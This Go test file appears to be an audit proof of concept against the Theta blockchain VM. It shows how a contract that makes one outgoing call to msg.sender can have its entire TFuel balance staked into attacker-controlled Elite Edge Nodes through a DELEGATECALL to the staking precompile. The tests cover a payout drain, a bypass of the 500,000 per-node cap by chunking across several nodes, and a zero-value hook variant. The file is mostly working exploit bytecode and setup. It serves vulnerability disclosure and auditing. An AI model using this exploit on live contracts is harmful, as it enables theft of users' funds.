package vm

// AUDIT PoC H - the "payout to msg.sender" callback drain (sTFuel NodeManager class).
//
// Family F established that the staking precompiles take the *owner* of the funds
// from `contract.CallerAddress`:
//
//	ledger/vm/contracts.go:104   callerAddr := contract.CallerAddress
//	ledger/vm/contracts.go:519   StakeToEEN(evm.StateDB, callerAddr, summary, tfuelWeiAmount)
//	ledger/vm/contract.go:125    AsDelegate(): c.CallerAddress = parent.CallerAddress
//	ledger/vm/vm.go:203          if db.GetBalance(sender).Cmp(amount) < 0 { return false }
//	ledger/vm/vm.go:216          db.SubBalance(sender, amount)
//
// H answers a different question than F: what does a contract need to do to be
// drained this way? F's victim had to *re-enter* the attacker (an outgoing call).
// H proves the strictly weaker precondition that real payout contracts satisfy:
// the victim only has to perform ONE outgoing call to an address the attacker
// controls - a `claim()`/`refund()`/`hook()` that pays `msg.sender`. The value of
// that call is irrelevant (H1 pays 1000 wei, i.e. a *deducted* reward, and the
// drain still takes the whole remaining balance, because the attacker reads the
// live balance with the BALANCE opcode instead of a hardcoded amount).
//
// H2 additionally shows that the 500,000 TFuel per-EEN cap enforced in
// ledger/state/elite_edge_node_pool.go:216-223 does not bound the theft: it is a
// per-EEN cap, so a 1.37M TFuel contract is drained in one transaction by
// chunking across several attacker-registered EENs.

import (
	"encoding/hex"
	"math/big"
	"testing"

	"github.com/thetatoken/theta/common"
	"github.com/thetatoken/theta/crypto/bls"
	"github.com/thetatoken/theta/ledger/state"
)

// ---------------------------------------------------------------------------
// bytecode helpers
// ---------------------------------------------------------------------------

func push2(v int) []byte { return []byte{0x61, byte(v >> 8), byte(v)} }

// mstoreWord emits: PUSH32 word ; PUSH2 off ; MSTORE
func mstoreWord(off int, word []byte) []byte {
	out := append([]byte{0x7f}, word...)
	out = append(out, push2(off)...)
	return append(out, 0x52)
}

// mstoreBalance emits: PUSH20 addr ; BALANCE ; PUSH2 off ; MSTORE
// (the amount is read from the live state, not baked into the code)
func mstoreBalance(addr common.Address, off int) []byte {
	out := []byte{0x73}
	out = append(out, addr.Bytes()...)
	out = append(out, 0x31) // BALANCE
	out = append(out, push2(off)...)
	return append(out, 0x52)
}

// delegateStakeToEEN emits DELEGATECALL(0xCE, in = mem[0:293]) ; POP
// (the input is <summary 229><32 zero padding><amount 32> - amount lives at 261)
func delegateStakeToEEN() []byte {
	return []byte{
		0x60, 0x00, // outSize
		0x60, 0x00, // outOffset
		0x61, 0x01, 0x25, // inSize = 293
		0x60, 0x00, // inOffset
		0x60, 0xce, // to = 0xCE
		0x5a, // GAS
		0xf4, // DELEGATECALL
		0x50, // POP
	}
}

// eenSummaryWords writes a 229-byte EEN summary into mem[0:256].
func eenSummaryWords(summary []byte) []byte {
	buf := make([]byte, 256)
	copy(buf, summary)
	var b []byte
	for i := 0; i < 256; i += 32 {
		b = append(b, mstoreWord(i, buf[i:i+32])...)
	}
	return b
}

// claimRuntime models a payout function: it pays `msg.sender` a fixed reward and
// stops. The reward is transferred *before* anything else happens, i.e. the
// contract has already deducted it from its balance when the attacker runs.
//
//	CALL(gas, CALLER, 1000 wei, 0, 0, 0, 0) ; STOP
func claimRuntime() string {
	return "6000" + "6000" + "6000" + "6000" + "6103e8" + "33" + "5a" + "f1" + "00"
}

// ---------------------------------------------------------------------------
// H1: one payout to msg.sender drains the payer's whole TFuel balance
// ---------------------------------------------------------------------------

func TestAuditH1_ClaimPayoutDrainsPayerTFuel(t *testing.T) {
	sk, err := bls.RandKey()
	if err != nil {
		t.Fatalf("bls keygen: %v", err)
	}
	pub := sk.PublicKey()
	pop := sk.PopProve()

	eenAddr := common.HexToAddress("0xEE00000000000000000000000000000000000011")
	payee := common.HexToAddress("0xD099000000000000000000000000000000000001") // victim: payout contract
	sv := newAuditView(t)

	// attacker pre-registers an EEN (costs him 10,000 TFuel, which stays his)
	eenp := state.NewEliteEdgeNodePool(sv, false)
	if err := eenp.DepositStake(attackerEOA, eenAddr, tfuelN(10000), pub, sv.GetBlockHeight()); err != nil {
		t.Fatalf("attacker EEN registration: %v", err)
	}
	setBalance(t, sv, attackerEOA, big.NewInt(0), big.NewInt(0))

	// victim holds 250,000 TFuel and exposes claim(): pay msg.sender 1000 wei
	victimTFuel := tfuelN(250000)
	setBalance(t, sv, payee, big.NewInt(0), victimTFuel)
	setCode(t, sv, payee, claimRuntime())

	// attacker contract: when the EOA calls it, it calls claim(); when the payout
	// contract calls it back, it runs the drain (amount = BALANCE(payee)).
	body := append(eenSummaryWords(blsSummary(t, eenAddr, pub, pop)), mstoreBalance(payee, 261)...)
	body = append(body, delegateStakeToEEN()...)
	body = append(body, 0x00)
	setCode(t, sv, attackerCtr, hex.EncodeToString(dispatcher(attackerEOA, payee, hex.EncodeToString(body))))
	setBalance(t, sv, attackerCtr, big.NewInt(0), big.NewInt(0))

	tx := smartTx(attackerEOA, attackerCtr, nil, 8_000_000)
	_, _, gasUsed, err := Execute(NewBlockInfo(auditHeight, big.NewInt(1), "mainnet"), tx, sv)
	if err != nil {
		t.Fatalf("tx failed: %v", err)
	}
	t.Logf("gas used for the whole callback drain = %v", gasUsed)

	staked := eenp2GetStake(t, sv, eenAddr, payee)
	expected := new(big.Int).Sub(victimTFuel, big.NewInt(1000)) // reward already paid out
	t.Logf("payee TFuel after claim      = %v", tfuelOf(sv, payee))
	t.Logf("attacker contract TFuel      = %v (the 1000 wei reward)", tfuelOf(sv, attackerCtr))
	t.Logf("stake in attacker's EEN      = %v (source = payee)", staked)

	if tfuelOf(sv, payee).Sign() != 0 {
		t.Fatalf("payee still holds %v TFuel", tfuelOf(sv, payee))
	}
	if staked == nil || staked.Cmp(expected) != 0 {
		t.Fatalf("expected a %v TFuel stake sourced from the payee, got %v", expected, staked)
	}
}

// ---------------------------------------------------------------------------
// H2: the 500k per-EEN cap does not bound the theft (chunking, one tx)
// ---------------------------------------------------------------------------

func TestAuditH2_CapBypassDrains137MTFuelInOneTx(t *testing.T) {
	type een struct {
		addr    common.Address
		pub     *bls.PublicKey
		pop     *bls.Signature
		summary []byte
	}
	eens := make([]een, 3)
	for i := range eens {
		sk, err := bls.RandKey()
		if err != nil {
			t.Fatalf("bls keygen: %v", err)
		}
		eens[i] = een{
			addr: common.HexToAddress(map[int]string{
				0: "0xEE00000000000000000000000000000000000021",
				1: "0xEE00000000000000000000000000000000000022",
				2: "0xEE00000000000000000000000000000000000023",
			}[i]),
			pub: sk.PublicKey(),
			pop: sk.PopProve(),
		}
	}

	payee := common.HexToAddress("0xD099000000000000000000000000000000000002")
	sv := newAuditView(t)

	pool := state.NewEliteEdgeNodePool(sv, false)
	for i := range eens {
		if err := pool.DepositStake(attackerEOA, eens[i].addr, tfuelN(10000), eens[i].pub, sv.GetBlockHeight()); err != nil {
			t.Fatalf("attacker EEN registration %d: %v", i, err)
		}
		eens[i].summary = blsSummary(t, eens[i].addr, eens[i].pub, eens[i].pop)
	}
	setBalance(t, sv, attackerEOA, big.NewInt(0), big.NewInt(0))

	victimTFuel := tfuelN(1370000) // the sTFuel NodeManager order of magnitude
	setBalance(t, sv, payee, big.NewInt(0), victimTFuel)
	setCode(t, sv, payee, claimRuntime())

	// MaxEliteEdgeNodeStakeDeposit is 500,000 and the pool checks
	// currentStake+amount, so each EEN can absorb 490,000 on top of the 10,000
	// the attacker already staked there when registering it.
	chunk := tfuelN(490000)
	body := []byte{}
	// chunk 1: 500,000 -> EEN1
	body = append(body, eenSummaryWords(eens[0].summary)...)
	body = append(body, mstoreWord(261, rightPad32(chunk.Bytes()))...)
	body = append(body, delegateStakeToEEN()...)
	// chunk 2: 500,000 -> EEN2
	body = append(body, eenSummaryWords(eens[1].summary)...)
	body = append(body, mstoreWord(261, rightPad32(chunk.Bytes()))...)
	body = append(body, delegateStakeToEEN()...)
	// chunk 3: whatever is left (370,000) -> EEN3
	body = append(body, eenSummaryWords(eens[2].summary)...)
	body = append(body, mstoreBalance(payee, 261)...)
	body = append(body, delegateStakeToEEN()...)
	body = append(body, 0x00)

	setCode(t, sv, attackerCtr, hex.EncodeToString(dispatcher(attackerEOA, payee, hex.EncodeToString(body))))
	setBalance(t, sv, attackerCtr, big.NewInt(0), big.NewInt(0))

	if _, err := runTx(t, sv, attackerEOA, attackerCtr, nil, 15_000_000, big.NewInt(0), big.NewInt(0)); err != nil {
		t.Fatalf("tx failed: %v", err)
	}

	// the claim paid the 1000 wei reward before the drain started
	rest := new(big.Int).Sub(victimTFuel, new(big.Int).Mul(chunk, big.NewInt(2)))
	rest = rest.Sub(rest, big.NewInt(1000))
	want := []*big.Int{chunk, chunk, rest}
	for i := range eens {
		got := eenp2GetStake(t, sv, eens[i].addr, payee)
		t.Logf("EEN %d (%v): stake sourced from payee = %v", i, eens[i].addr.Hex(), got)
		if got == nil || got.Cmp(want[i]) != 0 {
			t.Fatalf("EEN %d: expected %v, got %v", i, want[i], got)
		}
	}
	t.Logf("payee TFuel after drain     = %v", tfuelOf(sv, payee))
	t.Logf("total EEN stake             = %v", sv.GetTotalEENStake())
	if tfuelOf(sv, payee).Sign() != 0 {
		t.Fatalf("payee still holds %v TFuel", tfuelOf(sv, payee))
	}
}

// ---------------------------------------------------------------------------
// H3: no value is needed at all - a zero-value *notification* hook
// (onTokenTransfer / notify / "call me back") is enough, because the callback
// frame's CallerAddress is the victim regardless of the transferred amount.
// ---------------------------------------------------------------------------

func TestAuditH3_ZeroValueHookIsEnough(t *testing.T) {
	sk, err := bls.RandKey()
	if err != nil {
		t.Fatalf("bls keygen: %v", err)
	}
	pub := sk.PublicKey()
	pop := sk.PopProve()

	eenAddr := common.HexToAddress("0xEE00000000000000000000000000000000000031")
	notifier := common.HexToAddress("0xD099000000000000000000000000000000000003")
	sv := newAuditView(t)

	pool := state.NewEliteEdgeNodePool(sv, false)
	if err := pool.DepositStake(attackerEOA, eenAddr, tfuelN(10000), pub, sv.GetBlockHeight()); err != nil {
		t.Fatalf("attacker EEN registration: %v", err)
	}
	setBalance(t, sv, attackerEOA, big.NewInt(0), big.NewInt(0))

	victimTFuel := tfuelN(120000)
	setBalance(t, sv, notifier, big.NewInt(0), victimTFuel)
	setCode(t, sv, notifier, victimCallbackToSender()) // CALL(gas, CALLER, 0, ...)

	body := append(eenSummaryWords(blsSummary(t, eenAddr, pub, pop)), mstoreBalance(notifier, 261)...)
	body = append(body, delegateStakeToEEN()...)
	body = append(body, 0x00)
	setCode(t, sv, attackerCtr, hex.EncodeToString(dispatcher(attackerEOA, notifier, hex.EncodeToString(body))))
	setBalance(t, sv, attackerCtr, big.NewInt(0), big.NewInt(0))

	if _, err := runTx(t, sv, attackerEOA, attackerCtr, nil, 8_000_000, big.NewInt(0), big.NewInt(0)); err != nil {
		t.Fatalf("tx failed: %v", err)
	}

	staked := eenp2GetStake(t, sv, eenAddr, notifier)
	t.Logf("notifier TFuel (zero-value hook) = %v", tfuelOf(sv, notifier))
	t.Logf("stake sourced from notifier      = %v", staked)
	if tfuelOf(sv, notifier).Sign() != 0 || staked == nil || staked.Cmp(victimTFuel) != 0 {
		t.Fatalf("zero-value hook did not drain: balance %v stake %v", tfuelOf(sv, notifier), staked)
	}
}
